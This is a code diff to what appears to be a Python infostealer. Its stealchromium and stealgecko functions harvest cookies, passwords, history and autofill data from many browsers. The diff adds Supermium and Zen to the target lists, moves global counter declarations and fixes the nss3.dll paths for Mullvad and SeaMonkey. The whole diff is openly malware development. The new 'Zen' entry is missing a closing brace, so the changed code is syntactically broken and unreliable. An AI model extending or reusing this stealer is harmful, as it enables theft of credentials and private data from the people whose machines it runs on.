@@ -192,6 +192,11 @@ def screenshot():
 
 
 def stealchromium():
+    global cookie_count
+    global password_count
+    global browsing_history
+    global autofill_count
+
     chromium_paths = {
         'Chrome': {'path': localappdata + '\\Google\\Chrome\\User Data', 'localstate': localappdata + '\\Google\\Chrome\\User Data\\Local State'},
         'Chrome SxS': {'path': localappdata + '\\Google\\Chrome SxS\\User Data', 'localstate': localappdata + '\\Google\\Chrome SxS\\User Data\\Local State'},
@@ -201,6 +206,7 @@ def stealchromium():
         'Chromium': {'path': localappdata + '\\Chromium\\User Data', 'localstate': localappdata + '\\Chromium\\User Data\\Local State'},
         'Amigo': {'path': localappdata + '\\Amigo\\User Data', 'localstate': localappdata + '\\Amigo\\User Data\\Local State'},
         'Hola': {'path': localappdata + '\\Hola\\chromium_profile', 'localstate': localappdata + '\\Hola\\chromium_profile\\Local State'},
+        'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
         'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
         'Escosia': {'path': localappdata + '\\EscosiaBrowser\\User Data', 'localstate': localappdata + '\\EscosiaBrowser\\User Data\\Local State'},
         'Comet': {'path': localappdata + '\\Perplexity\\Comet\\User Data', 'localstate': localappdata + '\\Perplexity\\Comet\\User Data\\Local State'},
@@ -221,10 +227,6 @@ def stealchromium():
         'Vivaldi': {'path': localappdata + '\\Vivaldi\\User Data', 'localstate': localappdata + '\\Vivaldi\\User Data\\Local State'},
         }
         
-    global cookie_count
-    global password_count
-    global browsing_history
-    global autofill_count
     for name, path in chromium_paths.items():
         userdata = path['path']
         local_state = path['localstate']
@@ -332,8 +334,9 @@ def stealgecko():
         "Firefox": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Mozilla Firefox\\nss3.dll"},
         "Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
         "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
-        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"}, 
-        "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}
+        "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
+        "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll", 
+        "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
     }
     for name, path in gecko_paths.items():
         nss = path['nss']
